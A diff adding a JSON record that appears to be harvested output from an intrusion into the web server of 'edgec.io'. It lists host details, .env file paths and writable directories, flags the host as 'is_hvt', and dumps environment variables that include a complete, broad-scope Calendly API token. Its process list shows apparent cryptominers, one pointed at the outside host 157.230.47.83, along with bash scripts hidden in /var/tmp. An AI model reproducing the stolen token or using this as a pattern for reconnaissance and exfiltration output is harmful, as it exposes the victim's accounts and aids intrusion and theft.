@@ -1,0 +1,63 @@
+{
+  "target": "edgec.io",
+  "scan_time": "2026-10-22T15:12:05.852892",
+  "data": {
+    "platform": "linux",
+    "user_id": "ubuntu",
+    "kernel_release": "7.0.0-1013-aws",
+    "hostname": "ip-172-31-22-92",
+    "env_type": "METAL",
+    "files": [
+      "/home/ubuntu/edgec-website/.env.local",
+      "/home/ubuntu/edgec-website/.env.example",
+      "/home/ubuntu/edgec-website/package.json",
+      "/home/ubuntu/edgec-website/a.env"
+    ],
+    "host_cores_total": "1",
+    "usable_cores": "1",
+    "cpu_model": "Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz",
+    "has_avx2": "1",
+    "ram_total_mb": "1959",
+    "usable_ram_mb": "1959",
+    "ips": [
+      "172.31.22.92"
+    ],
+    "writable_paths": [
+      "/tmp",
+      "/dev/shm",
+      "/var/tmp",
+      "/home/ubuntu/edgec-website"
+    ],
+    "cwd": "/home/ubuntu/edgec-website",
+    "node_version": "v22.23.2",
+    "env_vars": {
+      "LANG": "C.UTF-8",
+      "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin",
+      "USER": "ubuntu",
+      "LOGNAME": "ubuntu",
+      "HOME": "/home/ubuntu",
+      "SHELL": "/bin/bash",
+      "INVOCATION_ID": "e9878f21a32d4e95b2f36296fe086fd1",
+      "JOURNAL_STREAM": "10:71602012",
+      "SYSTEMD_EXEC_PID": "1477617",
+      "MEMORY_PRESSURE_WATCH": "/sys/fs/cgroup/system.slice/edgec.service/memory.pressure",
+      "MEMORY_PRESSURE_WRITE": "c29tZSAyMDAwMDAgMjAwMDAwMAA=",
+      "NODE_ENV": "production",
+      "PORT": "3000",
+      "HOSTNAME": "127.0.0.1",
+      "NEXT_RUNTIME": "nodejs",
+      "__NEXT_PRIVATE_ORIGIN": "http://127.0.0.1:3000",
+      "__NEXT_PROCESSED_ENV": "true",
+      "CALENDLY_API_TOKEN": "eyJraWQiOiIxY2UxZTEzNjE3ZGNmNzY2YjNjZWJjY2Y4ZGM1YmFmYThhNjVlNjg0MDIzZjdjMzJiZTgzNDliMjM4MDEzNWI0IiwidHlwIjoiUEFUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiJodHRwczovL2F1dGguY2FsZW5kbHkuY29tIiwiaWF0IjoxNzg4OTY4MzI1LCJqdGkiOiI4ZmVjZDFjNC1mNzU4LTQ1ZDMtOTg2YS1jZjJmMmQ3M2EyNTIiLCJ1c2VyX3V1aWQiOiI2NjYxNmQ5NS01ZjRkLTRlNDMtODlhNS1iMTA2Mjg2ZmEyOTYiLCJzY29wZSI6ImF2YWlsYWJpbGl0eTpyZWFkIGF2YWlsYWJpbGl0eTp3cml0ZSBldmVudF90eXBlczpyZWFkIGV2ZW50X3R5cGVzOndyaXRlIGxvY2F0aW9uczpyZWFkIHJvdXRpbmdfZm9ybXM6cmVhZCBzaGFyZXM6d3JpdGUgc2NoZWR1bGVkX2V2ZW50czpyZWFkIHNjaGVkdWxlZF9ldmVudHM6d3JpdGUgc2NoZWR1bGluZ19saW5rczp3cml0ZSBncm91cHM6cmVhZCBvcmdhbml6YXRpb25zOnJlYWQgb3JnYW5pemF0aW9uczp3cml0ZSB1c2VyczpyZWFkIGNvbnRhY3RzOnJlYWQgY29udGFjdHM6d3JpdGUgbWVldGluZ19yZWNhcHM6cmVhZCBtZWV0aW5nX3JlY2Fwczp3cml0ZSBhY3Rpdml0eV9sb2c6cmVhZCBkYXRhX2NvbXBsaWFuY2U6d3JpdGUgb3V0Z29pbmdfY29tbXVuaWNhdGlvbnM6cmVhZCB3ZWJob29rczpyZWFkIHdlYmhvb2tzOndyaXRlIn0.1NUgzwviTAPbrrYsXChqhECBhtvLAlYwQ_zuGHFPECGzxJCWkwjr5nYT7hdaghpv12vEhHm5qUJ9Gb_3zV7wuw",
+      "RUST_MIN_STACK": "8388608",
+      "NEXT_DEPLOYMENT_ID": "",
+      "VIPSHOME": "/target"
+    },
+    "env_vars_count": "21",
+    "is_hvt": "true",
+    "procs": "1:/usr/lib/systemd/systemd --system --deserialize=93|1477617:next-server (v15.5.4)|1478384:/usr/lib/systemd/systemd-networkd|1478393:/usr/lib/systemd/systemd-journald|1478458:/usr/lib/systemd/systemd-udevd|1478522:/usr/lib/systemd/systemd-resolved|1482947:/sbin/multipathd -d -s|1482950:/usr/libexec/fwupd/fwupd|1482967:/usr/libexec/udisks2/udisksd|1482979:/usr/sbin/rsyslogd -n -iNONE|1482987:/usr/lib/polkit-1/polkitd --no-debug|1482993:nginx: master process /usr/sbin/nginx -g daemon on; master_process on;|1482994:nginx: worker process|1483007:/usr/sbin/ModemManager|1483233:sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect|1483653:/tmp/safenet-client|1483659:/tmp/safenet-client|1493858:/tmp/hasaneyoh -o 157.230.47.83:10006 -u FUCK -p FUCK -k|1499893:bash /var/tmp/.font-unix/d1_de79fb_w1|1499897:bash /var/tmp/.systemd-private/d2_dblpa2_w2|1499902:bash /var/tmp/.d3/d3_dmiobs_w3|1499950:jon_xrm01 -c /var/tmp/.font-unix/.c|2008497:sleep 5|2008504:sleep 2|2008505:sleep 5",
+    "listening_ports": "3000,443,22,80,53,53",
+    "llm_checks": []
+  },
+  "bypass_used": 0
+}
